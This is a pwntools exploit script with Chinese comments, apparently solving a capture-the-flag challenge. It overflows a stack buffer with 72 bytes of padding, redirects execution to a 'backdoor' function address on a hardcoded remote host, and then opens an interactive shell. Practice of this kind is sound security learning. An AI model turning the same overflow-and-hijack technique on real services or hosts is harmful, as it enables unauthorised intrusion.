from pwn import *

# 设置目标架构（这题是64位）
context.arch = 'amd64'
context.log_level = 'debug'

# 1. 建立连接
# 如果是在本地调试，取消下面这行的注释：
# io = process('./vuln')
# 连接远程靶机：
io = remote('47.113.178.182', 33611)

# 2. 接收欢迎信息，直到出现输入提示
io.recvuntil(b'name:')

# ==========================================
# 关键部分：构造 Payload
# ==========================================

# 目标后门地址 (从题目输出中获得的)
backdoor_addr = 0x4012a3

# 【重要】这里是偏移量，你需要找到正确的数字
# 常见的可能性：40, 72, 120, 136 等
offset = 72  # <--- 尝试更大的偏移量

# 构造 Payload：
# 1. 填充垃圾数据 (A * 偏移量)
# 2. 拼接后门函数的地址 (p64会自动将其转为小端序的二进制格式)
payload = b'A' * offset + p64(backdoor_addr)

print(f"[*] 发送 Payload，长度: {len(payload)}")

# 3. 发送 Payload
io.sendline(payload)

# 4. 切换到交互模式，如果成功，你就可以输入 ls, cat flag 等命令了
io.interactive()
